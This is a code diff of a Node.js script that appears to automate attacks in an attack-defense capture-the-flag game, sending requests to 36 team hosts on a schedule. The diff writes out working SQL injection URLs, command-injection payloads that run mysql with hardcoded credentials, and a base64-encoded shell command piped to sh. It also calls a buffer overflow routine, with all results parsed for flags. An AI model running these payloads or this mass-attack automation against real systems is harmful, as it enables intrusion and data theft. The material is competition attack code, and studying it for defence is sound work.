@@ -24,8 +24,8 @@ var parseFlag = function (regex, data) {
     }
 }
 
-var httpAttack = function (regex, genURL) {
-    var req = http.request(genURL(), function (res) {
+var httpAttack = function (regex, genURL, team) {
+    var req = http.request(genURL(team), function (res) {
         res.setEncoding('utf8');
         res.on('data', function (data) {
             flag = parseFlag(regex, data)
@@ -52,6 +52,15 @@ var pmcNameSearchInjectionRegex = /\>\d* (\w*)\<\/div\>/;
 var pmcDBPassthruRegex = /id\s+flag\s*\d+\s*(\w+)/
 var pmcDBPassthruEchoRegex = /flag\s*(\w+)/
 
+var pmcNameSearchInjectionTarget = function (team) {
+    return "http://10.8." + team.toString() + ".100:7788/menu.php/db/name/1'+UNION+SELECT+*+FROM+flag+UNION+SELECT+*+FROM+pm_list+WHERE+id='2";
+};
+var pmcDBPassthruTarget = function (team) {
+    return "http://10.8." + team.toString() + ".100:7788/menu.php/db/passthru/?=;%20mysql%20-D%20pmc%20-u%20joy%20-pchansey%20-e%20%22SELECT%20*%20from%20flag%22";
+};
+var pmcDBPassthruEchoTarget = function (team) {
+    return "http://10.8." + team.toString() + '.100:7788/menu.php/db/passthru/echo+-n+"bXlzcWwgLUQgcG1jIC11IGpveSAtcGNoYW5zZXkgLWUgInNlbGVjdCBmbGFnIGZyb20gZmxhZyI%3D"+%7C+base64+-d+%7C+sh+2>%261';
+};
 //
 //
 //  SSP login buffer overflow Attack
@@ -90,26 +99,19 @@ var sspLoginBufferOverflow = function (team) {
 var attackAll = function () {
     console.log('====== START ATTACKING ====='.red);
     for (team = 0; team < 36; team++) {
-
         // PMC name search injection
-        httpAttack(pmcNameSearchInjectionRegex, function () {
-            return "http://10.8." + team.toString() + ".100:7788/menu.php/db/name/1'+UNION+SELECT+*+FROM+flag+UNION+SELECT+*+FROM+pm_list+WHERE+id='2";
-        });
+        httpAttack(pmcNameSearchInjectionRegex, pmcNameSearchInjectionTarget, team);
         // PMC Passthru
-        httpAttack(pmcDBPassthruRegex, function () {
-            return "http://10.8." + team.toString() + ".100:7788/menu.php/db/passthru/?=;%20mysql%20-D%20pmc%20-u%20joy%20-pchansey%20-e%20%22SELECT%20*%20from%20flag%22";
-        });
+        httpAttack(pmcDBPassthruRegex, pmcDBPassthruTarget, team);
         // PMC Passthru Echo
-        httpAttack(pmcDBPassthruEchoRegex, function () {
-            return "http://10.8." + team.toString() + '.100:7788/menu.php/db/passthru/echo+-n+"bXlzcWwgLUQgcG1jIC11IGpveSAtcGNoYW5zZXkgLWUgInNlbGVjdCBmbGFnIGZyb20gZmxhZyI%3D"+%7C+base64+-d+%7C+sh+2>%261';
-        });
-
+        httpAttack(pmcDBPassthruEchoRegex, pmcDBPassthruEchoTarget, team);
+        // SSP Buffer Overflow
         sspLoginBufferOverflow(team);
     }
 };
 // main
 var rule = new schedule.RecurrenceRule();
-rule.minute = 30;
+rule.minute = 55;
 
 program
     .version('0.0.1')
@@ -120,7 +122,7 @@ program
 if (program.minute) {
     if (typeof program.minute === 'number') {
         rule.minute = program.minute;
-        console.log('Attack at __:' + program.minute);
+        console.log('Attacking at __:' + program.minute);
     }
 }
 
